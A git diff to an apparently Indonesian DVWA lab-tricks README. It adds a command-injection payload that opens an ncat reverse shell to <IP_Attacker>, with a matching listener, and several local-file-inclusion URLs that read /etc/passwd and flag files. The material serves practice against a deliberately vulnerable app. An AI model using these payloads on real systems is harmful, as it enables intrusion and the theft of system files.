@@ -17,6 +17,19 @@ Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan 
 ```
 ![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%202.JPG)
 
+Menjalankan Reverse Shell di Server
+```sh
+127.0.0.1; ncat <IP_Attacker> 9999 -e /bin/bash
+```
+
+Listener
+```sh
+nc -lnvp 9999
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%208.JPG)
+
+
 ### Security Medium
 ```sh
 127.0.0.1& ls
@@ -82,5 +95,25 @@ http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
 ```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%207.JPG)
+
+### Security Medium
+```sh
+http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php
+```
+
+Membuka isi file **/etc/passwd** di server
+```sh
+http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
+```
+
+### Security High
+```sh
+http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/flags/fi.php
+```
+
+Membuka isi file **/etc/passwd** di server
+```sh
+http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
+```
 
 Referensi: https://portswigger.net/web-security/learning-path
